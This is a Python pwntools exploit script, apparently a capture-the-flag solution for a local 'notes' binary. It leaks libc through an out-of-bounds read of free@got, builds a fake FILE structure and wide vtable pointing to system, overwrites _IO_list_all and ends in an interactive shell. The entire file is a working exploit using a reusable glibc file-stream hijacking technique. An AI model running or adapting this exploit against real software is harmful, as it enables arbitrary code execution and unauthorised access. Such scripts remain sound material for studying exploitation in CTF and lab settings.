from pwn import *



elf = ELF('./notes_patched')
libc = ELF('./libc.so.6')

context.binary = elf
context.terminal = ["tmux", "splitw", "-h"] 


p = process('./notes_patched')


def create(size, content):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'SIZE: ', str(size).encode())
    p.sendlineafter(b'CHARS): ', content)

def read_note(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'INDEX: ', str(idx).encode())
    p.recvuntil(b'NOTE: ')
    
    data = p.recvuntil(b'< BACK', drop=True)
    
    if data.endswith(b'\n'):
        data = data[:-1]
    return data

def write_note(idx, offset, content):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'INDEX: ', str(idx).encode())
    p.sendlineafter(b'INDEX: ', str(offset).encode())
    p.sendlineafter(b'DATA: ', content)
    time.sleep(0.05) 



log.info("libc leak")
# Index -16 points to free@got
libc_leak = u64(read_note(-16).ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym['free']
log.success(f"Libc Base: {hex(libc.address)}")



offset_FILE = 0x00
offset_wide_data = 0x100
offset_wide_vtable = 0x200 # Moved to 0x200 to avoid overlap


fake_file = flat({
    0x00: u64(b"  sh\x00\x00\x00\x00"), # _flags: "  sh" passed to system
    0x88: 0,                         # _lock: arbitrary location in our file
    0xa0: 0,                         # _wide_data: at 0x100 from start of heap ptr
    0xc0: 1,                         # _mode: 1 triggers wide stream flow if glibc sees this var as > 0
    0xd8: libc.sym['_IO_wfile_jumps']# vtable: _IO_wfile_jumps
}, length=224, filler=b'\x00')



wide_data = flat({
    0x18: 0, # _IO_write_base
    0x20: 1, # _IO_write_ptr
    0xe0: 0  # _wide_vtable pointer we will patch it to point to wide_vtable with heap leak
}, length=0x100, filler=b'\x00')



wide_vtable = flat({
    0x68: libc.sym['system']
}, length=0x80, filler=b'\x00')

payload = fake_file.ljust(offset_wide_data, b'\x00')
payload += wide_data.ljust(offset_wide_vtable - offset_wide_data, b'\x00')
payload += wide_vtable

log.info("first note at index 0 with our fake file and leaking heap ptr")
create(20000, payload)


heap_ptr = u64(read_note(0).ljust(8, b'\x00'))
log.success(f"Heap Pointer: {hex(heap_ptr)}")


log.info("patching.")


if any(b in p64(heap_ptr) for b in [0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]):
    log.error("aslr issue")

# point to writable memory heap_ptr + 0x10. arbitrary location since glibc just has to dereference it
write_note(0, 0x88, p64(heap_ptr + 0x10))

# point to wide_data struct heap_ptr + 0x100
write_note(0, 0xa0, p64(heap_ptr + offset_wide_data))

# point to wide_vtable heap_ptr + 0x200
write_note(0, 0x1e0, p64(heap_ptr + offset_wide_vtable))


log.info("Overwriting _IO_list_all.")
io_list_all = libc.sym['_IO_list_all']
offset_to_io_list_all = io_list_all - heap_ptr

#overwrite _IO_list_all with pointer to our fake FILE struct
write_note(0, offset_to_io_list_all, p64(heap_ptr))


p.sendlineafter(b'>> ', b'5')
p.interactive()